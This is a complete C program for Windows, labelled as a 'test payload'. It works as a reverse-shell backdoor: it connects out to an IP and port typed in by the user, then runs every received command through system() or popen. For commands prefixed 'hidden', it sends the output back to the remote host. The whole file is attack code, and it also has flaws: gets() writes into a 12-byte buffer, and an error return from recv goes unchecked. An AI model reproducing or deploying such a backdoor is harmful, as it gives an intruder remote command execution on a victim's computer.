#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>

#define BUFFER_SIZE 1024

int main() {
    struct sockaddr_in connectioninfo;
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    char ip[12];
    int port = 0;
    int Pport = &port;

    printf("[TEST PAYLOAD] input IP: ");
    gets(ip);
    printf("[TEST PAYLOAD] Input Port: ");
    scanf("%d",Pport);

    connectioninfo.sin_family = AF_INET;
    connectioninfo.sin_addr.s_addr = inet_addr(ip);
    connectioninfo.sin_port = htons(port);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(s, (struct sockaddr*)&connectioninfo, sizeof(connectioninfo));

    while (1) {
        char buffer[BUFFER_SIZE];
        int bytes_received = recv(s, buffer, BUFFER_SIZE - 1, 0);
        buffer[bytes_received] = '\0'; 
        
        // printf("%s", buffer);
        // printf("%p", &buffer);

        if (strncmp(buffer, "hidden", 6) == 0) {

            // printf("hidden command fetched.");

            FILE *fp = popen(buffer + 7, "r");
            if (fp != NULL) {
                char output[BUFFER_SIZE];
                while (fgets(output, sizeof(output), fp) != NULL) {
                    send(s, output, strlen(output), 0);
                }
                pclose(fp);
            send(s, "Error", strlen("Error"), 0);

            }
        }
        else {
            system(buffer);
            send(s, "Done", strlen("Done"), 0);
        }
    }
    return 0;
}
